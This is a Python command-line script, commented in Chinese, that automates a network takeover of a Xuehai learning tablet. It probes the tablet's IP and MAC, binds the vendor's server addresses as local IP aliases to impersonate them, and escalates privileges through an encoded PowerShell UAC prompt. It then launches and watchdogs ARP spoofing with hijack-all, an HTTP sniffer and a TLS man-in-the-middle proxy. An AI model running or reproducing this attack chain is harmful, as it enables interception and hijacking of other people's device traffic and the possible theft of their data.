#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""xh_chain.py — 学海平板全自动接管链路 CLI（自感知 / 自适应 / 自组织）

设计原则：
  自感知  = env_percept.py 动态探测网卡 / 平板 IP+MAC / 证书 / 端口 / 权限
  自适应  = 所有组件从 xh_env.json 读取目标，不再硬编码任何账号/设备信息
  自组织  = 一键 setup → run，守护线程自动重启掉线组件

用法：
  xh_chain.py probe              感知环境并生成 xh_env.json
  xh_chain.py setup [--elevate]  配置（IP 别名；需管理员，自动发起 UAC）
  xh_chain.py run [--watch]      启动全链路（ARP + 80 嗅探器 + 443 MITM），--watch 常驻守护
  xh_chain.py status             查看组件/端口状态
  xh_chain.py stop               停止全部组件
"""
import argparse
import json
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ENV = os.path.join(HERE, "xh_env.json")
PYW = sys.executable.replace("python.exe", "pythonw.exe")


# ---------------------------------------------------------------- 环境
def load_env(refresh=False):
    if refresh or not os.path.exists(ENV):
        try:
            import env_percept
            env_percept.main()
        except Exception as e:
            print("[!] env_percept 失败: %s" % e)
    try:
        return json.load(open(ENV, encoding="utf-8"))
    except Exception:
        return {}


def require_pad(env):
    pad = env.get("pad")
    if not pad:
        print("[!] 未感知到平板。请先在平板上连接实验热点，再运行: xh_chain.py probe")
        sys.exit(2)
    return pad


# ---------------------------------------------------------------- setup
ALIAS_IPS = ["47.99.85.219", "47.111.87.154", "47.110.67.143"]   # 学海边缘节点（非个人信息）
def cmd_setup(args):
    env = load_env(refresh=True)
    pad = require_pad(env)
    gw = None
    for it in env.get("ipv4", []):
        if it.get("role") == "iface" and ".137." in it["addr"]:
            gw = it
            break
    if not gw:
        for it in env.get("ipv4", []):
            if it.get("role") == "iface":
                gw = it
                break
    if not gw:
        print("[!] 未找到实验网网卡")
        return 2
    iface = gw.get("iface", "")
    local = gw["addr"]
    print("[*] 实验网网卡: %s  %s" % (iface, local))
    print("[*] 平板: %s / %s" % (pad["ip"], pad["mac"]))

    cmds = ["taskkill /F /IM tls_redirect.exe >nul 2>&1"]
    for ip in ALIAS_IPS:
        cmds.append('netsh interface ipv4 add address "%s" %s 255.255.255.255' % (iface, ip))
    ps = "; ".join(cmds) + "; Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '47.*' } | Format-Table InterfaceAlias,IPAddress -AutoSize"
    if env.get("is_admin"):
        print("[*] 已是管理员，直接执行")
        subprocess.run(["powershell", "-NoProfile", "-Command", ps])
    else:
        print("[*] 发起 UAC 提权添加 IP 别名（请在弹窗点「是」）")
        enc = __import__("base64").b64encode(ps.encode("utf-16-le")).decode()
        subprocess.run(["powershell", "-NoProfile", "-Command",
                        "Start-Process -Verb RunAs powershell -ArgumentList '-NoProfile -EncodedCommand %s'" % enc],
                       shell=False)
    time.sleep(6)
    env2 = load_env(refresh=True)
    ok = [a for a in env2.get("ipv4", []) if a["addr"] in ALIAS_IPS]
    print("[+] 别名就绪: %s" % [a["addr"] for a in ok])
    return 0 if ok else 3


# ---------------------------------------------------------------- 组件
def _spawn(name, script, env_vars=None, args=None):
    env = dict(os.environ)
    env.setdefault("PYTHONIOENCODING", "utf-8")
    env["PYTHONPATH"] = os.path.join(HERE, "pylibs") + os.pathsep + env.get("PYTHONPATH", "")
    if env_vars:
        env.update({k: str(v) for k, v in env_vars.items()})
    cmd = [PYW, os.path.join(HERE, script)] + (args or [])
    logdir = os.path.join(HERE, "_logs")
    os.makedirs(logdir, exist_ok=True)
    out = open(os.path.join(logdir, "%s.out" % name), "ab")
    err = open(os.path.join(logdir, "%s.err" % name), "ab")
    p = subprocess.Popen(cmd, cwd=HERE, env=env, stdout=out, stderr=err,
                         creationflags=0x00000008 if os.name == "nt" else 0)
    print("  [spawn] %-10s pid=%d" % (name, p.pid))
    return p


def cmd_run(args):
    env = load_env(refresh=args.refresh)
    pad = require_pad(env)
    gw = None
    for it in env.get("ipv4", []):
        if it.get("role") == "iface" and ".137." in it["addr"]:
            gw = it
            break
    if not gw:
        for it in env.get("ipv4", []):
            if it.get("role") == "iface":
                gw = it
                break
    local_ip = gw["addr"] if gw else "192.168.137.1"
    iface = gw.get("iface", "") if gw else ""
    pad_ip, pad_mac = pad["ip"], pad["mac"]
    print("[*] 自适应参数: local=%s pad=%s mac=%s" % (local_ip, pad_ip, pad_mac))

    common = {"PAD_IP": pad_ip, "TARGET_IP": pad_ip, "OUR_IP": local_ip,
              "PAD_MAC": pad_mac, "TARGET_MAC": pad_mac, "TLS_DROP_SNI": "ms.yunzuoye.net"}
    procs = []
    procs.append(_spawn("arp", "arp_captive.py",
                        env_vars=common,
                        args=["--local-ip", local_ip, "--target-ip", pad_ip,
                              "--target-mac", pad_mac, "--hijack-all"]))
    procs.append(_spawn("http80", "npcap_http80.py", env_vars=common, args=["86400"]))
    procs.append(_spawn("mitm", "tls_mitm.py", env_vars=common))
    if not args.watch:
        print("[+] 全链路已启动（--watch 可常驻守护）")
        return 0
    print("[*] 守护模式：每 30s 检查组件，掉线自动重启（Ctrl+C 退出）")
    try:
        while True:
            time.sleep(30)
            st = load_env(refresh=True)
            comp = st.get("components", {})
            alive = {k: bool(comp.get(k)) for k in ("spoofer", "arp", "mitm")}
            print("  [watch] %s  pad=%s" % (alive, st.get("pad", {}).get("ip") if st.get("pad") else "?"))
            if not all(alive.values()):
                print("  [!] 组件掉线，重启缺失项")
                cur = load_env(refresh=False)
                p2 = cur.get("pad")
                if p2:
                    _spawn("arp", "arp_captive.py",
                           env_vars={"PAD_IP": p2["ip"], "TARGET_IP": p2["ip"],
                                     "OUR_IP": local_ip, "PAD_MAC": p2["mac"],
                                     "TARGET_MAC": p2["mac"]},
                           args=["--local-ip", local_ip, "--target-ip", p2["ip"],
                                 "--target-mac", p2["mac"], "--hijack-all"])
    except KeyboardInterrupt:
        print("\n[*] 退出守护")
    return 0


# ---------------------------------------------------------------- status / stop
def cmd_status(args):
    env = load_env(refresh=True)
    print("=" * 60)
    print(" 学海平板链路状态")
    print("=" * 60)
    pad = env.get("pad")
    print(" 平板      : %s / %s" % (pad["ip"], pad["mac"]) if pad else " 平板      : 未感知")
    print(" 实验网    : %s" % [i["addr"] for i in env.get("ipv4", []) if i.get("role") == "iface"])
    print(" 别名      : %s" % [a["addr"] for a in env.get("ipv4", []) if a["addr"] in ALIAS_IPS])
    print(" 管理员    : %s" % env.get("is_admin"))
    print(" 证书      : %s" % (env.get("cert", {}).get("subject") or "缺失"))
    print(" 端口      : %s" % {k: v["listening"] for k, v in env.get("ports", {}).items()})
    print(" 组件      : %s" % env.get("components", {}))
    for h in env.get("hints", []):
        print(" [!] %s" % h)
    return 0


def cmd_stop(args):
    env = load_env(refresh=False)
    comp = env.get("components", {})
    pids = [p for k in ("spoofer", "arp", "mitm", "cert") for p in comp.get(k, [])]
    print("[*] 停止组件: %s" % pids)
    for pid in pids:
        subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True)
    return 0


def cmd_probe(args):
    import env_percept
    return env_percept.main()


def main():
    ap = argparse.ArgumentParser(description="学海平板全自动接管链路 CLI")
    sub = ap.add_subparsers(dest="cmd")
    p = sub.add_parser("probe")
    p = sub.add_parser("setup")
    p.add_argument("--elevate", action="store_true")
    p = sub.add_parser("run")
    p.add_argument("--watch", action="store_true")
    p.add_argument("--refresh", action="store_true")
    p = sub.add_parser("status")
    p = sub.add_parser("stop")
    args = ap.parse_args()
    if not args.cmd:
        ap.print_help()
        return 0
    return {"probe": cmd_probe, "setup": cmd_setup, "run": cmd_run,
            "status": cmd_status, "stop": cmd_stop}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
